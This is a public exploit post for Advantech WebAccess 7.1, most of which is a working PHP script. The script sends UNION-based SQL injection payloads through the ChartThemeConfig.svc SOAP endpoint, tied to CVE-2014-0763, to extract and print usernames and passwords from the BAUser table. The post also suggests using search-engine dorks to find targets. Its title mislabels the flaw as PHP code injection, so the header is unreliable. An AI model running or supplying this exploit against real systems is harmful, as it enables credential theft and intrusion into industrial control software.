=============================================================================================================================================
| # Title     : Advantech WebAccess 7.1 PHP Code Injection Vulnerability                                                                    |
| # Author    : indoushka                                                                                                                   |
| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 135.0.1 (64 bits)                                                            |
| # Vendor    : https://www.advantech.com/en                                                                                                |
=============================================================================================================================================

POC :

[+] Dorking Ä°n Google Or Other Search Enggine.

[+] Code Description: The code is an exploit written in PHP to target a SQL Injection vulnerability in Advantech WebAccess 7.1 through the SOAP API, specifically via ChartThemeConfig.svc.
	
	 ( Related : https://packetstorm.news/files/id/180782/  Related CVE Numbers: CVE-2014-0763 )
	
[+] save code as poc.php.

[+] Set Target : line 92

[+] USage : php poc.php 

[+] PayLoad :

<?php

class AdvantechExploit {
    private $target;
    private $webDatabase;

    public function __construct($target, $webDatabase) {
        $this->target = rtrim($target, '/');
        $this->webDatabase = $webDatabase;
    }

    private function buildSoapRequest($injection) {
        $xml = "<?xml version='1.0' encoding='UTF-8'?>
        <s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/'>
            <s:Body>
                <GetThemeNameList xmlns='http://tempuri.org/'>
                    <userName>{$injection}</userName>
                </GetThemeNameList>
            </s:Body>
        </s:Envelope>";
        return $xml;
    }

    private function sendRequest($xml) {
        $url = $this->target . "/Services/ChartThemeConfig.svc";
        $headers = [
            'Content-Type: text/xml; charset=UTF-8',
            'SOAPAction: "http://tempuri.org/IChartThemeConfig/GetThemeNameList"'
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);

        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }

    public function checkVulnerability() {
        $mark = bin2hex(random_bytes(5));
        $injection = "' UNION ALL SELECT '{$mark}' FROM BAThemeSetting WHERE '1'='1";
        $xml = $this->buildSoapRequest($injection);
        $response = $this->sendRequest($xml);
        return strpos($response, $mark) !== false;
    }

    public function exploit() {
        if (!$this->checkVulnerability()) {
            echo "Target is not vulnerable.";
            return;
        }

        echo "Exploiting SQL Injection...\n";
        $separator = bin2hex(random_bytes(3));
        $mark = bin2hex(random_bytes(5));

        $injection = "' UNION ALL SELECT UserName + '{$separator}' + Password + '{$separator}BAUser' FROM BAUser "
            . "UNION ALL SELECT '{$mark}' FROM BAThemeSetting WHERE '1'='1";

        $xml = $this->buildSoapRequest($injection);
        $response = $this->sendRequest($xml);

        if (!$response) {
            echo "Failed to retrieve data.";
            return;
        }

        preg_match_all("/<a:string>(.*?)<\/a:string>/", $response, $matches);
        $users = [];
        foreach ($matches[1] as $entry) {
            if ($entry !== $mark) {
                $users[] = explode($separator, $entry);
            }
        }

        if (empty($users)) {
            echo "No users found.";
            return;
        }

        echo "Extracted Users:\n";
        foreach ($users as $user) {
            echo "Username: {$user[0]}, Password: {$user[1]}\n";
        }
    }
}

$target = "http://example.com/BEMS";
$webDatabase = "C:\\WebAccess\\Node\\config\\bwCfg.mdb";

$exploit = new AdvantechExploit($target, $webDatabase);
$exploit->exploit();

Greetings to :=====================================================================================
jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
===================================================================================================